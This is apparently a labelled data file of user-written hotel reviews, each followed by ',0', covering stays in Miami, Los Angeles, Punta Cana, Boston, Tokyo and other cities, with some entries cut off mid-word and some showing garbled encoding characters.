"nice hotel, but wouldn't do it again we stayed one night after a cruise, nov 2004.when we arrived at the hi the lobby was packed with people waiting to check in or out for the cruises. we were happy that our room was ready. we were staying 1 night after the cruise. the room was very nice and the view of the bay and the cruise ships was beautiful. i could have sat looking out the window all day but i couldn't wait to get down to the pool. the pool is very small and the water was freezing. there is construction going on right in the back of the hotel. the seating area is also very small and most of the loungers were taken by people who have all their luggage. i guess they were either waiting to leave for their cruise, an air flight or a room. because of all the high buildings there really was not much sun.we stayed at this hotel because the last time we were in miami we went to the bayfront shopping area and had a good time. the second visit was disappointing. the area seemed different.i also want to let you know that if you are returning from a cruise the taxi drivers do not want to take you from the port to the hotel because it is such a small fare. there was a moan when we told them where we wanted to go and the taxi driver seemed mad that he got such a small fare and the only thing he said was i want 1 dollar for the bridge toll. it's a 6 dollar fare. at least the 4 dollar tip made him smile.since our cruise came in early in the morning, the next time i would book a 2o'clock flight and take the tour offered by the cruiseline to the everglades or go all the way to the airport and stay at one of those hotels if i needed to. there is nothing wrong with the hotel. i just would do things differently next time because i felt bored and thought that it was a waste of time sitting at the hotel all day when i could have gone home.",0

"Unsafe, fights, theft, poor management. I would not recommend this resort to women, families with kids or elderly. It is an Unsafe, disorganized and poorly managed resort.My husband and I traveled to Punta Cana, Bavaro Iberostar Hotel and Resort for our first anniversary in Aug 2008. My parents, bother-in-law and his wife joined us as well. This was my second time in Punta Cana, but first time at Bavaro Iberostar in Punta Cana. We had been to other Iberostar hotels in Mexico before and liked it a lot.The lobby and appearance of the resort is nice like most Iberostars, so we were very excited when we arrived at the hotel after an exhausting flight from Los Angeles. To our disappointment, this hotel was managed very poorly: We encountered two major problems: Poor Service and more importantly poor Security!The front desk (check-In) was a disaster: We were not greeted or acknowledged. They had misplaced our reservation records and it took them 3 hours to find our names in their system just to tell us our rooms which had been assigned to us originally, were sold to other guests just last week and there were no more rooms available at the resort for the first 4 nights of our one week stay! Please note that since we travel frequently to different destinations around the world, we do our homework before the trip. We had called and double checked our reservation directly with the hotel staff before departing LA. We also had a copy of my credit card bill reflecting hotel charges (paid in full for 6 people, 3 ocean view suites, 8 nights) and the reservation detail confirmation email with us handy! They had simply sold many more rooms than they had available. They told us we would have to transfer/downgrade to a much cheaper neighboring hotel/resort for the first 4 nights and they will accommo",0

"fantastic hotel - couldn't have asked for more!!! my husband and i and our 3 children just recently stayed at the hilton in universal city whilst we were visiting the us. the hotel was fantastic!!! best location for visiting universal studios and for seeing the sights of la (we did have a car though). universal studios was across the road so we had no worries about trying to get through the la traffic to get there on time. universal city was next door and that was fantastic for dinners, lots of child friendly restaurants and shops and we felt very safe strolling through the area at night. there was a free shuttle back to the hotel if we wanted to use it rather than walking, we did take advantage of that on a few nights after we had been walking all day!! the room itself was great - large, clean and great views! we were worried as we had two rooms and wanted interconnecting but that was no problem which was a great relief. we stayed on the executive level which included a free continental breakfast each day which was fantastic! nice and healthy - fresh fruit, cereal, coffee, toast, yoghurt etc..great start to the day.i was really happy that we stayed at this hotel it was the first hotel we stayed at on our holiday and we returned to it on our last night before leaving the us. would highly recommend it to anyone!!!!",0

"terrible hotel for the money the good: i love downtown la and there is much to do with staples center, good public transit (subway ) to long beach, great restaurants, and dodger stadium is just a short drive away. i stay in la about every other month for work and always have a great time. did i mention i love staying in los angeles. the hotel lobby and bar are absolutely beautiful i couldn't wait to get to my roomthe bad: the rooms are not acceptable, i actually thought seriously about going to a different hotel! luckily my wife was not with me because i doubt that she would have stayed. the rooms have beds and linens that must be 20 years old. everything looked tired and dirty. the tv is the same 13 inch tv i had in my kitchen 25 years ago. i asked an employee if he had ever eaten at the sushi restaurant or if he had ever heard anything. he said he wouldn't eat there as he noted that if smelled really fish at times and he had heard bad things. i have stayed at the competition; bonaventure, marriott, wilshire grand and would gladly have stayed at any of them, although i do not ecommend the wilshire. the bonventure is a good deal and kind of neat to hang out in and around, just remember none are modern mavels.",0

"good service but rude desk clerk oct. 7, 2006 i arrived at the hotel and went to the front desk to check in.the desk clerk was checking my information in the computer and i asked her if there were any suites available as i had called the hotel a week before my arrival and and was assured that i could upgrade to a suite.she immediately began to yell that if i wanted an upgrade i would have to pay for it. when i went to my room, i took the aaa tour book back to the desk and showed her where it specifically stated that the reservation could be upgraded if a suite was available and it would be free of charge.the same desk clerk started to yell again stating that she had told me when i called that i could upgrade for a charge and that was her rules. in fact i had spoken to a gentleman when i had called the week before, i never spoke to a lady. i asked her why she was raising her voice and if this was the way she spoke to guests. she completely ignored me and just kept on yelling.i asked to speak to the manager and she told me she was the manager when in fact the manager's name was clearly displayed on the wall.she walked away from the desk and the manager came to assist me about 10 mins. later.this incident was very humiliating as other guests were present. i am writing this review because this kind of behavior was totally unacceptable and hopefully no other guests will be treated in this manner.overall service was great and the staff as a whole were very courteous and helpful.",0

"convenient and clean have stayed in a wide range of hotels - 2 star to 5 star so generally i have my expectations managed. this bw was actually a little above expectations; part of that might have to do with the fact that we arrived fairly early to check in - around noon - and they had a room ready and upgraded us to a suite on the 7th floor. now, it was a suite at a best western, but still nice to have the extra space. convenient to downtown although with the light rail construction that's going on in and around the city, need to plan a little extra time. plenty of extra parking although none of it is covered, so don't leave anything in your car if you're there over the summer or it will be cooked! definitely also recommend the restaurant zen which is a couple miles north on central ave and recently opened. fitness center is a bit of a joke, but the pool, although small, was clean and had ample seating (lounge chairs and tables).",0

awesome stay we just returned from a four night stay at the inn. we really enjoyed the large room and the way housekeeping kept it looking wonderful during our stay. after a long day of sightseeing we knew that we would be coming back to a clean and well tocked room. we were delighted that it was close to the t and tat there were places to eat right there. the room service was great too. there were no problems with checking in or out and the staff was incredably nice. it is defintaly somewhere we would stay again.,0

"Great Find and a Pleasant Surprise March 20-21  March 29: We found the Beach House Hotel to be a very pleasant surprise, in marked contrast to numerous negative reviews in Trip Advisor. Though our rooms were small, they were clean and comfortable, and despite forewarnings, turned out to be quiet for our two pre-cruise nights. The small, intimate hotel did have the distinct feel of a boutique hotel and had a unique ambiance.The biggest beef among reviewers seemed focused on poor staff service. Forewarned with this information, we went out of our way to test the staff on service at every opportunity. We found all we encountered to be very friendly and accommodative. We would particularly single out Sabrina at the front desk for her concern and responsiveness. Upon check-in we noted that the hotel provided i-pod dock in our room was lacking a power cord. Upon reporting this to Sabrina, she showed up in less than five minutes with a replacement. She was equally prompt in responding to our request for extra hangars for our closet. Other staff assistance was provided regarding rain forest cruise information and directions to other venues in the area. The front desk staff promptly summoned a taxi when requested. We enjoyed two great dinners at the hotel restaurant (Cafe LePlage) which was in the most romantic setting imaginable. We chose tables for both dinners that were actually on the sand beach behind the hotel. We enjoyed friendly out-door bar service prior to dinner. The hotel beach area was illuminated with torches. They have three Asian daybeds on the beach. Their sheer curtains billowed in the pleasant breeze off the sea and caught the reflective light from the torches. It was an absolutely gorgeous setting (click on é¥?¸otel photosé¥?at the Trip Advisor review page for the hotel). The food was excellent. Peter and Gretchen rendered excellent and attentive table service. On the Saturday night of our post-cruise stay at the hotel, we did experience the noise we came to expect from reading the reviews. However, we thought it worth it because the source of the noise was a traditional Brazilian wedding that took place at the hotel on the aforementioned beach. The festivities included about a 45 minute non-stop performance by a drum corps (apparently a Brazilian wedding custom), which we enjoyed very much. Our second dinner on the beach was actually within feet of the ceremony and subsequent reception. We almost felt like wedding guests, though we abandoned the party early as it went on on until at least 3:00 am. To deal with the noise, we simply turned on our i-pod in our room to great effect in muffling the noise. We requested a late check-out on our departure ",0

"longest week of our life! we traded a week of timeshare to stay here and what a mistake! the customer service was consistently bad, however the food was worse. the restaurant/bar was supposed to close at 10pm, but on 2 different nights, it closed early. our sheets were too short and when we called about housekeeping, they offered to deliver sheets, but it stopped there. we had housekeeping once for the entire week. the shower head was like standing under a high pressure washer without any actual é¥?¸?howeré¥? we were given bad information during check-in about the internet and then when questioned to resolve the issue, was told sorry, we can't do anything about it. overall it was a disappointing resort and i would never recommend it.",0

very disapointed my first time to the west coast and i had to pick this property? very average all the way the way! the noise level at night from my neighbors was way too loud. the service was slow and the room had a funny smell. the staff made me feel like an unwelcome visitor not a special guest. no wifi service although they advertise there is? this not a good best western - to bad seatle is very nice.ab,0

"ok for business--not for fun this hotel has decent rooms and if you are in phoenix for business this is all you need. it is nice to receive a complimentary paper (everyday minus sunday) and if you stay inside the hotel you will be pleased with the decor and style. the beds are quite comfortable! if you are planning on using the internet, be prepared to pay $16/day which i found outrageous! now, if you are hoping to enjoy and relax at this hotel--it is definitely not a resort--stay in scottsdale for that! the pool was quite small and quite dirty--the water slide is not staffed continually and you have to find staff to turn it on and monitor it--it also dumps into a small area that is only for the slide...not a place to have fun and relax and enjoy around the pool. we also happend to know more about the area than the concierge and the front desk staff was quite rude. quite disappointing for those areas.",0
"a wonderful stay at the shiba park hotel our family of five just returned from a wonderful trip to japan (tokyo and kyoto). in tokyo we stayed a total of nine nights at the shiba park hotel. the staff there is very courteous and their english is very good. we had no problems at all with regards to communication. services including safe deposit boxes and foreign currency exchange were right there, no need to go to a bank. the concierge desk was fully equipped to answer all of our questions, book tours, book transport to narita air[port as well as most other tourist needs. bell staff were courteous, spoke good english and even refused a tip. excellent marks to the staff.the rooms were large for japan standards. we had a very large three bed room with a huge bath on the 12th floor of the annex. our other room was a two bedroom unit on the 10th floor of the annex. it was also very large by japanese standards for a two twin bed room. each room had its own climate control as well as a tv with three english speaking channels (cnn, bbc and bloomberg financial). japanese channels were also available. very entertaining, even though we did not understand a word of what they were talking about! pay channels were also available. vending machines were available on most floors, though we found the convenience store at the end of the block to be less expensive and offer more selections.we ate breakfast every morning at the western cuisine coffee shop. it was a full hot/cold breakfast buffet. very pricey, but similar to most all other japanese hotels for a comparable breakfast, about $20/person. there is a starbucks and mcdonalds a short walk away. we ate dinner one night there after a late tour. dinner was less expensive than breakfast! we didn't try any of the other restaurants in the hotel as they were pricey and there are several choices for meals of all kinds within a short walk.location was very good. a three minute walk to daimon subway station, five minute walk to hammamatsucho (jr) train station. as you may know, there are always many restaurants near train stations.the overall appearance of the hotel is nice and clean. the hotel facilities are somewhat",0

"fantastic resort, overall we've just returned from a trip which included a week's stay at this ponte hilton. over 20 of us were in phoenix from the uk for a wedding. everyone was blown away with the resort's facilities for a pretty good price. it was great having the extra room in the one-bedroom suites. the casitas were great as well but not sure if they were worth the extra money although they were in a great setting. the water park was fantastic for kids and we could have done with longer there. restaurants were good although the service in the laguna grill was pretty slow - fine if you're not in a hurry. we were woken up one morning at 4am by maintenance as a faulty toilet had flooded our apartment and was starting to flood downstairs. we did feel that the hotel could at least have offered us a free breakfast for the inconvenience of waking our family up in the middle of the night while they mopped up for 1.5 hours! i would have not hesitated in giving 5 stars if they had handled the flood better.",0

beautiful location! what a beautiful hotel! we stayed only one night and arrived late (enjoyed sedona too long) and our kids were very disappointed to find the river ranch closing as we arrived. (it closes at 6 and opens at 9 a.m.) we had to leave in the morning so that was out too but we were able to enjoy one of the other pools. the room (2 room suite) was huge and the beds very comfy. there was a bar area with a refrig. and two tv's. it was an easy drive to a nice mall and we got to the airport in less than 20 minutes.check-in was very easy with friendly staff. we would enjoy a stay here again if we had more time!,0
loved the roosevelt my stay at the roosevelt hotel was pretty good. i thought the rooms were sound proof (mine overlooked the carpark) and the staff were very friendly and professional. this hotel is a huge old but renovated place with heaps of style from charlie chaplain days. it took me a while to undertand the lay out of the hotel but once that was out of the way it was great. the pool area was so kitch with an art deco feel. really cool. i had the junior suite which was plenty of space for one person. the daily morning delivery of papers was great and the bathroom was groovy. the only problem was the toilet blocked but as i later found alot of toilets block in the usa. i would definatley stay there again. i loved it. it wasnt the best best best hotel in the world but for the price ($100) per night and the fab location it was well worth it. just make sure your shuttle drops you off around the back of the hotel not on hollywood blvd. the back is actually where the front entrance is. your first impressions will benifit if you do that.,0

"good location we stayed at this hotel in december 2006.pros:- excellent location, very close to all the action- good price - secure parking- pool looked nice (although we did not use it)cons:- room was kind of dark (no view) and felt very dated- carpets need cleaning and room had a slight smell to it.overall the hotel was okay for the price. it was basic, but nice.",0

"comfortable and convenient my teenage daughter and i stayed at beverly garland's holiday inn while vacationing in the los angeles area. we visited universal studios, hollywood, and burbank, and found the hotel to be centrally located. the highlight of my experience of this hotel was the comfortable bed. although i chose not to take advantage of it, the hotel offered a pillow menu giving us the opportunity to change the type of pillows we had depending on whether we slept on our back, side, etc. the staff was extremely friendly right down the the security guard. the room was a little small, but clean. the grounds were clean, and there were a lot of trees around the hotel. the only real disadvantage i could find to our room was the level of freeway traffic noise. the hotel is located right next to a major freeway, and i had a little difficulty getting to sleep the first night we stayed. i purchased ear plugs for our second night, but didn't end up using them because i fell asleep pretty quickly after sinking into our comfy bed. we ate at tulas on our second evening. the food was pretty good, but a little overpriced for what we got. overall, i considered our stay at this hotel a positive experience.",0

"another great stay orchid suites continues to be a great bargain in a prime hollywood location. i've stayed here with family members two years in a row and would certainly return. rooms are large with (in many cases) a well-equipped full kitchen. underground parking is safe, secure, and convenient. pool is a pleasant diversion and well-maintained. i noticed a problem with a loose spotlight in the pool this year, reported it to the front desk and was impressed to see it fixed in a matter of hours. at some hotels, that type of problem means closing the pool for days at a stretch. the rooftop garden/sunning spot is a great place to relax and watch the activity below.the only minor problem this year was with a noisy neighbor above us. when i mentioned it to the front desk, they asked the family to take another room on the first floor: problem solved.staffers are friendly, helpful and well-informed. we left a video cord behind this year, and they tracked it down and mailed it to us at no charge. overall, a great stay and a great bargain. i highly recommend it.",0

"way out in boston best western terrace inn, 1650 commonwealth avenue, boston, ma, usastayed: sep 2008, one night double room.location: actually on mount hood road off commonwealth avenue, between washington street and sutherland street boston mbta green line b tram stops. the tram journey is roughly 40-50 mins from park street and government centre downtown stations, so the hotel is not very handy for doing things in the centre of the city. there are few facilities near the hotel (the hotel staff said: one thai, one italian restaurant, a 7-11 shop and a pharmacy-cum-us mail office-we found them very near).the hotel is more of a motel, with three separate blocks: reception and two separate bedroom blocks, which have no covered ways between them, so if it is raining é¥?there are steps to reception but there is access by ramp via dining area for wheel-chairs. bedroom block 1xx (ground)-2xx has no lift to upper floor. did not assess block with rooms 3xx-5xx. being just off commonwealth avenue saves it from traffic noise, so it is quieter than one may anticipate. the room we had was plain, but very spacious and cleané¥??o criticism of that.the welcome was pleasant and helpful but the é¥?¥¥ontinental breakfasté¥?was at the poorer end of the scale: cereals, yoghourt, fresh fruit, bread and rolls / bagels but no meats or cheeses. the fruit juices were really diluted fruit é¥??rinksé¥?rather than fresh or 100% reconstituted. the é¥?¦rockeryé¥?is of the plasticised paper variety plus plastic é¥?¦?lassesé¥?and polystyrene-foam tea/coffee containers (é¥?¦upsé¥?. similarly, the cutlery is plastic, with no large spoon.the hotel was willing to extend check-out time by one hour (to noon) and to safe-keep luggage after check-out until later in the day.is this the boston location or quality you want for $171 ($192 incl. taxes)?",0

"not what i reserved! my wife and i stayed at the millennium biltmore for the 2008 la marathon. i made the reservation in december 2007 and was told by the hotel's customer service that we would be guaranteed a room with a single king bed. simple enough. the day we checked in, our room had 2 full beds. at the rate we were paying, we could've at least gotten the room we requested. we contacted the front desk and were told: there's nothing we can do, we're sold out. i asked to speak to a manager and was told the manager was unavailable for the night! sure, the place has a cool lobby and the staff is friendly for the most part, but what does it matter if you don't get what you reserved?",0

under renovatoin i stayed one night on a business trip at the standford court and picked this hotel for the location and marriott points. it is under some serious renovation - if you like a formal lobby wait until they are done and i am sure it will be beautiful. right now there is just a small area cordoned off to register and no real lobby - just an area that at one point must have been a conference room that has some couches and a make shift bar. the rooms are small but clean and well appointed. staff is very accommodating and location is great on nob hill. health club is closed but complimentary pass to neighbor facility is available. also no concierge level until renovation is complete.,0

"Superb! We stayed at the Aqua Ocean Tower twice in the same month - we took a week out to go to Maui (and got married) and were so impressed we arranged to stay again when we returned.From our first arrival we were very impressed with the friendliness and courtesy of the staff who couldn't have been more helpful. Even though the hotel is going through a transition period of rooms being remodelled it was a never an inconvenience and if there were any issues you could feel confident that they would be remedied straight away.Angie, Grace, Keenan and Sam desere a mention for being so professional and cheerful, and for answering any queries we may have had. A particular mention must go to Leonor for being such a fantastic host to us - she made us feel very special, with treats and fresh fruit being left in our room, hugs to say hi and such a genuinely thoughtful and caring attitude to her guests and their stay that my wife and I have never experienced anywhere else. When we mentioned that we had been married on Maui we found that Champagne had been delivered to our room which was a really nice gesture and pleasant suprise. She's a real gem and very much an asset to the hotel and really made our stay that much more memorable.The hotel's location is literally just a short walk from the beach with the added benefit of a nearby regular trolly service to the Ala Moana shopping centre stopping every few minutes if needed.Body boards and towels etc. could be borrowed from the reception which was very handy.The new rooms are very stylish and totally up to ",0

"very clean, basic accomodations in a great part of town we booked this hotel based on the great review on tripadvisor and we were not disappointed. it is the perfect hotel if you are planning on spending your days in nyc and not in your room. there are no real amenities, i.e. pool, restaurant, etc. it is a converted apt building and it looks like one. but on the upside, you have an apartment-style accomodations meaning kitchen, living room, etc. pros: the front desk staff could not have been nicer and more accommodating. from holding our luggage to giving directions they were friendly and efficient.the location is excellent. the subway is a few blocks away which will take you right downtown in under 15 minutes. 5th avenue is a few blocks away as is broadway and times square. easy walking distance to all the midtown attractions.the breakfast they provide in your room is a great bonus. ideal to start your day at your own pace. there's cereal (hot and cold), coffee, hot chocolate, tropicana juices, cream cheese, bagels, bread, muffins and danish. the hotel is spotlessly clean in every respect.very, very comfortable beds. quiet rooms with little to no street noise.cons:there is no luxury here beyond the fact that the rooms and bathrooms are quite spacious. it is basic accommodations but very comfortable. i guess this isn't really a negative, is it? just don't expect a plush lobby (there is no lobby!).if you're claustrophobic, the elevator may be an problem. it's very small and there's only one but we never had to wait more than a minute for it to come.all in all. i would stay here again. great value for the price.",0

"great location for exploring san francisco we arrived at the tuscan inn at 1:00 am and quickly checked in. we were exhausted from traveling from boston. the room, (an inner courtyard room) while adequate, had a wall air condtioner which was very noisy. the next morning the hotel staff were very accomodating in changing our room and moving our belongings to an outside room which was not only larger, but had central air. apparently the inner rooms have the wall units. the hotel staff was consistently friendly and helpful throughout our stay, especially cliff, the consierge, providing directions, maps, dinner recommendations and reservations, and suggestions for sightseeing.the location is perfect to explore the city. fisherman's wharf (pier 39) is a very short walk, the embarcadero, ferry to alcatraz, cable cars, and giardelli square are all within walking distance. bart is also convenient to the hotel.the complementary wine hour offers the opportunity to relax and meet other guests before heading out to evening activities.we recommend this hotel without hesitation, and will definatly stay there again on return the san francisco.",0

"if you're not a tolerant person, don't stay here after reading the reviews prior to taking my trip i was somewhat nervous but also skeptical that maybe people were being overly sensitive. since we are very patient and flexible people i thought our vacation would be perfect as always. unfortunately the reviews were so right. we were a family of four with two adults, and two teenage children. we booked two rooms and asked expedia to confirm ahead of our arrival that we have rooms on the same floor. i also e-mailed them a few days ahead making the same request. when we arrived at the hotel i told the front desk person about my request before he began the check-in. his exact words to me were oh, that's a problem. we cannot accommo",0

"godd location, affordable price, one bad surprise.. we were looking for an affordable place to stay in boston and we got an amazing deal at the best western through a travel agency. for 130$/night, free parking and breakfast included, this 3-star hotel was more than what we expected.check-in was very easy. reception staff was very helpful. manager was friendly. breakfast was acceptable. room was clean and of decent size. bathroom was very clean.no complaints until the last morning when, right before checkout, we realized that we had shared the room with a mouse or some other rodent!!! a chocolate bar had small bite marks all over it as if some animal had tried to eat it through the wrapper!! as we were leaving anyway, we did not make a big fuss out of it. the employee at the reception made a note of it, and told us that they have had a rodent problem in the past!! it might just be bad luck. we might even go back to this hotel as the location and price are unbeatable. but we will definitely never leave any food or candies in our room again!",0
"don't ever, ever stay at this property - 3101 n 32nd street upon entering the first room i was assigned, i first noticed the safety lock was torn off the door frame, followed by a grapefruit sized hole in one window, the bed sitting on the floor, the smoke detector hanging off the wall and the phone in pieces. i then was given a deluxe room. better than the first in that it didn't have broken windows, etc. when i went to sleep that night there was no blanket on the bed and when i called the desk i was told we don't put blankets on every bed. i was also given only one towel (no wash cloths, hand towels, etc.) and was told we are full and don't give everyone towels. the bed also kept falling out of the frame. several staff members and the repair guy were in and out of my room. the next day i called travelodge customer service and filed a complaint. i was told they would fax the property and attempt a resolution. that night at about 3:00 am while sleeping in the bedroom area i was awoken by the sound of the front door closing. i ran out and saw my laptop computer and some cash were missing (i had set the deadbolt and put the chain on). the chain was torn away from the frame. i called the front desk and was told i was the only one with the key and what did i want them to do about it. i said to call the police. the officer determined that there was no forcible entry and that someone with a key card had entered the room. the police were not able to get in contact with the manager. i checked out in the morning. the person at the front desk was able to get in touch with the manager. he didn't want to speak with me and when i insisted he told me it was impossible, etc. and more or less accused me of lying. he told me he would speak with his staff and would get back to me in a few days. i have left numerous messages and sent a fax and have yet to hear from the him after 3 weeks. worse yet, i received a letter from travelodge corporate that basically says these are independent owners and all that corporate does is license the name. there are no operating standards and the property is solely responsible. i phoned the president's office and was told that by their franchise agreements they do not get involved.",0

"Review of The Paradisus Palma Real from a Canadian Perspective, WHITBY, ON When looking at all of the reviews prior to going to the Paradisus Palma Real, I had to search a long time before I actually found a Canadian review so I thought I would write one.My husband and I stayed at the Paradisus Palma Real from Sept 29-October 06 2007, and let's be honest, the hotel and staff are absolutely PHENOMINAL!ROOMS: Very spacious and clean. Easily the nicest hotel room we have ever had in the Caribbean with a two person Jacuzzi tub, separate steam spray shower, flat screen T.V. CD player in the room. The room was very big with a separate sitting area and we had a canopied king sized bed. The A.C. worked great and there was also a ceiling fan. The maid (Santa) did a great job with the room everyday and our mini-bar was overflowing everyday as well with beer, fruit juices and pop.POOL: Enormous and fantastic with 5 pool temperature Jacuzzis, two fountains, a swim-up bar, in water pool loungers both with and without a palapa cover. There was a bridge traversing the pool with a gazebo as part of the bridge that gave a wonderful view of the entire pool which was massive and extremely clean. There is a beach entrance, a step beach entrance and several (I think 3-4) stair entrances. The pool was surrounded with plenty of lounge chairs and palapas and Bali beds. Since we went in off season, we had no problem getting a Bali bed every day of our stay.RESTERANTS: There were five A La Carte restaurants and a buffet restaurant which were all excellent. The food presentation was excellent and the actual food itself was even better. The restaurants had the best air conditioning of all the restaurants I have ever been to in the Caribbean which is nice since you don't want to have dinner and be perspiring the entire time. You had to make reservations for the A La Carte restaurants with the concierge desk but we never had to wait in line nor did we ever have problems with getting the restaurant that we wanted on the night that we wanted or the hour we wanted them for.BEACH: The resort is on an absolutely beautiful stretch of BAVARO Beach. The beach is very long and wide with white sand and lots of loungers and palapas and beautiful palm trees. The colours of the ocean on a clear day are sparkling turquoise with navy mixes and the water is very warm and inviting. The staff is always out cleaning any seaweed that washes to shore with any storms out at sea and there was never as issue. The beach is extremely clean and the resort staff is always keeping watch making you feel very safe and secure even at night.SERVICE: I think that the Paradisus resort personally hand picks every one of its staff members. The staff in all of the restaurants is comparable to none. Gloria, Annie and Hector in the Naos Buffet restaurant made breakfast and lunch a pleasure always waiting to seat us and have are drink order taken so that they would be at the table before we got back with our meal. Hector would even notice if I didn't join my husband for breakfast because I would still be full from the fabulous meal the night before and would ask my husband where I was and if I was Okay! Lennon and Francisco who are the bar tenders at the swim-up/pool bar are the best I have ever encountered greeting us by name every day and having our drinks on the bar ready as we were still swimming up to it. Lenny's favorite line is What you want, I GOT IT and he has this great donkey and Spiderman impressions.CASINO: Had black jack, roulette, a poker area and lots of slot machines. If there was more I honestly can't remember seeing it since we only went in the one time to take a look around. It was early and it didn't seem to be very busy but I heard a gentleman say he won close to $1000 the night before. Now I don't know if that was in dollars or pesos but he won at any rate.ENTERTAINMENT: To be honest, I have been to the D.R. 5 times at other resorts and saw all of the shows on the previous visits so I didn't see any of the shows. I know that we did try to a couple of nights and had a hard time finding the venue and the actual time the shows started. The location of the entertainment would change depending on the night and the time often altered at well to accommo",0

"Wedding at Sivory My husband and I had our wedding at Sivory Punta Cana. So far I think only a few adventurous people had their wedding there. It's a wonderful place for people that are not looking for the traditional church and country club reception wedding.

The resort staff tried their best to accomo",0
nice hotel-very big! we had a great room-no problems. stayed for 5 nights for a conference held on the property. only complaint: it was beyond hot the whole week but the pools were warm! it was like taking a bath; we swam at night but it wasn't very refreshing. on our last night we heard that one of the pools on the other side of the property was much cooler but it was too late to check it out.,0

"lived up to tripadvisor reviews and my expectations i decided to take a last minute trip to new york for three days over the july 1 canada day weekend. i was travelling alone and wanted a clean place at a reasonable cost in chelsea, not usually a realistic goal for new york. tripadvisor reviews pointed me in the direction of the chelsea lodge, and i wasn't disappointed. i ususally stay in 4 star hotels when i am travelling with my partner, so i was a bit nervous. it is not fancy and the room i stayed in on the second floor was small, but it was all i was looking for and lived up to my expectations. the location is superb only 3 blocks from 23rd and 8th and the a, c and e subway lines. only 10-15 minutes to time square uptown and 10-15 minutes to the world trade centre downtown. my room was exceptionally quiet, the air conditioning was welcomed on a very hot weekend, the sink and shower in the room were convenient, and the shared bathroom was no problem. i enjoyed several good restaurants on 8th avenue, and you can even have a meal at 3 a.m. in the city that never sleeps! i felt safe walking at any time.it's not luxury but a very good budget place that is clean and welcoming. although i didn't get the names of the men on reception, i enjoyed my brief chats and they seemed genuinely interested. i would recommend this place and would return if i was travelling alone.",0
great value and location Great value and location. Small and modest lobby but staff was exceptionallly friendly and helpful. Room was spacious for NYC and very clean. Up,0
"great for pre/post cruise we just stayed here jan. 13, 2005 and the 17th, for pre and post cruise nights. the hotel itself was fine, typical holiday inn with a restaurant, a small pool and the rooms were clean. the best part of it was the location to the cruise port and mainly the bayside marketplace across the street. lots of great shops and booths set up, good restaurants (chili's and hard rock- and hooters if you're into that). it's about a $25 taxi ride to the airport, and about $10 to the port. we hopped on a bus that took us to south beach which is where the nice beaches to swim and lay out are. there's no water access from this hotel, since it's more of a marina/port type waterfront area. i'd probably stay there again, just for price and convenience, even though south beach looks like a better place to stay for beaches and amenities (it's just a lot farther from airport and cruise port, which means more taxi $ and higher priced hotels).",0

"great location! would definitely stay again! great location! would definitely stay again!my husband and i were very pleased with this hotel. the best part about it was definitely the location. ité¥??? right on the hollywood walk of fame. as soon as you walk out the front door you see the stars on the sidewalk. ité¥??? also steps away from the chinese theatre and the kodak theatre, where you can see a great view of the hollywood sign. thereé¥??? a lot of good shopping and restaurants nearby too. if the main point of your trip is to see hollywood, you probably wouldné¥?? even need a car (and could avoid the steep price for valet). jimmy kimmel live is filmed right down the street and they give away free tickets when you walk by.the hotel itself is obviously very old, but has undergone several renovations. the rooms are decorated very modern with unique artwork. i guess because the hotel was built so long ago the layout was a little strange é¥?you had to walk through the closet to get to the bathroom. the bathroom was very small but was sufficient. there was little furniture in the actual room é¥?you either sat on the bed or on the one desk chair. there were two big windows which made the room look bright and cheery. one small annoyance was that our room faced hollywood high school and the band was practicing on our first night, but it wasné¥?? too bothersome. the only thing i would say needed improvement in the room was the bed linens or actually lack of linens. it might sound petty to some but there was no top sheet on the bed and the comforter had a couple stains.apparently there are several stories of ghosts at this hotel but luckily (or unluckily depending on your viewpoint) we didné¥?? run into any! the lobby is extremely dim with candles lit all around giving it a somewhat spooky feeling (especially if you read the ghost stories before you go!). i would definitely recommend this hotel to anyone visiting hollywood who wants to be in the heart of it all! we booked our room on a name your own price website and got a great deal (i was shocked it was accepted!). ié¥?? not sure the rooms are worth the actual prices ié¥???e seen on other websites ($200-$250) so i would check around for the best price before booking!",0

"terrible! this hotel was filthy from top to bottom, including the motel-style rooms and common areas. we had large stains on the walls and ceilings. housekeeping was shoddy at best. the highway was noisy, the desk staff and management were rude and argumentative, the customer service very poor at every level, and the restaurant below average in quality and service. this place is way below normal embassy suites standards, so don't be fooled by the name. this is a poorly managed property from top to bottom. it was a huge disappointment. i recommend looking elsewhere.",0

"just okay! my husband stayed here for one night to be close to lax for a morning flight. we checked in and arrived in our room, which was clean and located on a higher floor. we had dinner in the bar, which service was slow but, we didn't have a lot of choise since we wer advised not to walk around the area, it was too dangerous. we expected some noise from outside the hotel due to the proximity to the airport, however we were very surprised at the internal noise. all night we heard the running water, and other noises we couldn't identify. we inquired after dinner with the concerige about checking-in at lax and checking bags when to leave the hotel in the morning. we were advised to check-in online and bag drop at the airport with no waiting in line. we left for lax approx. 1.5 hr prior to departure, and discovered the shuttle was delayed 15-20 minuets and the hotel began to use taxis to transport people to the airport. upon arrival to lax, we has to wait in line and almost missed out flight. i would not recommend this hotel due to the noise factor, and the shuttle problem.",0

"what a great hotel! don't understand the complaints on this website about this hotel. we stayed here for two nights in late august and loved everything about it. first, the location was great. it was within walking distance of both the waterfront and pike place market, and we could easily take the monorail to the space needle. (there are hills in seattle, so if you have someone with you who has trouble walking, you may want to consider taking a bus or taxi.) both the lobby and the room were nicely decorated, and the staff was very helpful. being on pioneer square meant that we could go next door or right across the street to get a drink and/or something to eat. of course, we didn't walk through the square at night because of the street people who hung out there, but that's just common sense. we were never bothered by anyone, and because this hotel is so well located we were able to easily enjoy this great city. if you're worried about street noise, call the hotel directly and ask for an interior room. we had an interior king and it was very quiet. we plan to return to seattle, and when we do, we'll stay at the best western pioneer square hotel again.",0

"amazing pool area we stayed in one of the property's casitas twice in the last month, so this is a review of that particular type of room. the casitas are large and have a private carport and private entry. they have lots of room and would be great for families. the downstairs had a dining table, 2 sofas, t.v., wet bar and small refrigerator with 1/2 bath. upstairs is the main bedroom with full bath and bed. the decor in the casitas was a bit run down, with really old burgundy carpet, very outdated bathroom fixtures, and furniture in desperate need of reupholstering. i think with some simple remodeling updates, this could be a first-rate property. one of our casitas had a nice large balcony off the main bedroom, while the other had a huge sundeck right off the second floor. the sundeck had a full sized table with 4 chairs and an umbrella and 2 lounge chairs! awesome for soaking in the arizona sun. one casita overlooked a private pool, which was so much fun to step right outside and hit the water. this is a super resort for kids! the main swimming pool area is amazing! the hole-in-the-wall river ranch has a huge lazy river, waterfalls, mini golf, a western themed town and a gorgeous outdoor patio with a firepit and smores at night. if you have kids, this is a super place to stay!",0

